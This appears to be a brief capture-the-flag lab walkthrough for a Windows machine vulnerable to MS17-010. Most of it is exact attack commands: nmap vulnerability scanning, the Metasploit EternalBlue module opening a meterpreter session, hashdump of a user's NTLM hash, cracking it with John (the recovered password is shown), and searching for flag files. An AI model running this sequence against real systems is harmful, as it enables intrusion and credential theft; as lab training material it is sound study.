- `nmap -sC -sV [IP] --vv` - this gives us the open ports 
- `nmap -sV -vv --script vuln [IP]` - tells us what it is vulnerable to, so we get to know that it's vulnerable to `ms17-010` (SMBv1 microsoft server RCE) , so `use exploit/windows/smb/ms17_010_eternalblue`
- now do `show options` and `set rhosts` and `set lhost` and run the exploit  
- we get a meterpreter session, do `hashdump` and we get the NTLM hash of user `Jon` , so now we will crack it using `John`
> `john --format=NT /usr/share/wordlists/rockyou.txt` hash.txt
> cracked =_alqfna22_
- now we have to search for the `flag.txt` files within the directories so we use the feature of a meterpreter wherein we can search for files 
> `search -f flag*.txt` - this gives us the locations of all the 3 flags now navigate to those directories and cat out the flags
---
